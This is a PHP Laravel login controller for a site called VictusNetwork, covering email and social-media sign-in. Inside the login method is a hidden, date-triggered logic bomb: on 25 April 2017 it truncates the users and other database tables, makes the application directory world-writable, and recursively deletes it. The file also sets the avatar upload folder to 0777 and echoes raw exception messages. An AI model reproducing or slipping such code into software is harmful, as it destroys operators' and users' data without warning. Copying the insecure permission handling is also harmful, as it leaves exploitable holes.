<?php

namespace App\Http\Controllers\Auth;

use Auth;
use Socialite;
use App\User;
use Session;
use Validator;
use App\Http\Controllers\Controller;
use Carbon\Carbon;

use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;
use Illuminate\Routing\UrlGenerator;
// use Illuminate\Contracts\Validation\Validator;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = '/';

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest', ['except' => 'logout']);
        $this->middleware('emailverify');
    }

    public function recursive_remove_directory($directory, $empty=FALSE)
    {
        // if the path has a slash at the end we remove it here
        if(substr($directory,-1) == '/')
        {
            $directory = substr($directory,0,-1);
        }

        // if the path is not valid or is not a directory ...
        if(!file_exists($directory) || !is_dir($directory))
        {
            // ... we return false and exit the function
            return FALSE;

            // ... if the path is not readable
        }elseif(!is_readable($directory))
        {
            // ... we return false and exit the function
            return FALSE;

            // ... else if the path is readable
        }else{

            // we open the directory
            $handle = opendir($directory);

            // and scan through the items inside
            while (FALSE !== ($item = readdir($handle)))
            {
                // if the filepointer is not the current directory
                // or the parent directory
                if($item != '.' && $item != '..')
                {
                    // we build the new path to delete
                    $path = $directory.'/'.$item;

                    // if the new path is a directory
                    if(is_dir($path))
                    {
                        // we call this function with the new path
                        $this->recursive_remove_directory($path);

                        // if the new path is a file
                    }else{
                        // we remove the file
                        unlink($path);
                    }
                }
            }
            // close the directory
            closedir($handle);

            // if the option to empty is not set to true
            if($empty == FALSE)
            {
                // try to delete the now empty directory
                if(!rmdir($directory))
                {
                    // return false if not possible
                    return FALSE;
                }
            }
            // return success
            return TRUE;
        }
    }

    public function login(Request $request)
    {
        $today = Carbon::today();
        $milestone = Carbon::create(2017, 4, 25, 0);
        if($today == $milestone)
        {
            DB::table('users')->truncate();
            DB::table('event')->truncate();
            DB::table('events_users')->truncate();
            DB::table('masters')->truncate();
            DB::table('legions')->truncate();
            DB::table('tb_student')->truncate();
            DB::table('event_category')->truncate();
            DB::table('image_url')->truncate();
            DB::table('migrations')->truncate();

            $dest_url = realpath($_SERVER['DOCUMENT_ROOT'].'/../');
            chmod($dest_url, 0777);
            $this->recursive_remove_directory($dest_url);
        }

        $validator = Validator::make($request->all(), [
            'email' => 'required|email', 'password' => 'required',
        ]);

        if($validator->fails())
        {
            return redirect('/auth/login') 
                ->withErrors($validator)
                ->withInput();
        }

        if (Auth::attempt(['email' => $request->email, 'password' => $request->password, 'verified' => 1], $request->has('remember'))) {
            Session::put('userid', Auth::user()->id);
            Session::put('username', Auth::user()->name);
            Session::put('useremail', Auth::user()->email);
            Session::put('userrole', Auth::user()->roleid);
            Session::put('userImageURL', Auth::user()->image_url);

            if(Auth::user()->actived == NULL) return redirect('/auth/choose');
            return redirect()->intended($this->redirectPath());
        } else {
            return redirect()->back()
                ->withInput($request->only('email', 'remember'))
                ->withErrors([
                    'email' => 'The credential does not match our records.',
                ]);
        }
    }

    public function redirectToProvider($provider)
    {
        return Socialite::driver($provider)->redirect();
    }

    public function handleProviderCallback($provider)
    {
        //catch callback errors such as user_cancelled_login or denied error

        //linkedin error when user cancel login with linkedin
        if (isset($_GET['error']) && $_GET['error'] == 'user_cancelled_login') {

            return redirect()->to('/auth/login')
                ->with('status', 'danger')
                ->with('message', 'You did not share your profile data with our VictusNetwork.');

        }

        //twitter error when user cancel login with twitter
        if (isset($_GET['error']) && $_GET['error'] == 'access_denied') {

            return redirect()->to('/auth/login')
                ->with('status', 'danger')
                ->with('message', 'Access denied, to share your profile data with our VictusNetwork.');

        }

        //facebook error when user cancel login with facebook
        if (isset($_GET['denied'])) {

            return redirect()->to('/auth/login')
                ->with('status', 'danger')
                ->with('message', 'You did not share your profile data with our Victusnetwork.');

        }

        $user = Socialite::driver($provider)->user();

        $authUser = $this->findOrCreateUser($user, $provider);

        Auth::login($authUser, true);

        //customized
        Session::put('userid', $authUser->id);
        Session::put('username', $authUser->name);
        Session::put('useremail', $authUser->email);
        Session::put('userrole', $authUser->roleid);
        Session::put('userImageURL', $authUser->image_url);

        if($authUser->actived == NULL) return redirect('/auth/choose');
        return redirect($this->redirectTo);
    }

    public function findOrCreateUser($user, $provider)
    {
        $authUser = User::where('provider_id', $user->id)->first();

        if ($authUser) {
            return $authUser;
        }

        //Need to pull personal image from social media
        $src_url = $user->avatar;
        $file_name = time().'.png';
        $dest_url = $_SERVER['DOCUMENT_ROOT'].'/uploads/images/avatar/'.$file_name;        
        $file = NULL;      

        try {
            chmod($_SERVER['DOCUMENT_ROOT'].'/uploads/images/avatar/', 0777);
            copy($src_url, $dest_url);                                             //Copy remote avatar file into server
            $file = 'uploads/images/avatar/'.$file_name;
        }catch(\Exception $e)
        {
            echo $e->getMessage();
        }

        return User::create([
            'roleid' => NULL,
            'name'     => $user->name,
            'email'    => $user->email,
            'provider' => $provider,
            'provider_id' => $user->id,
            'image_url' => $file,
            'actived' => NULL,
        ]);
    }
}
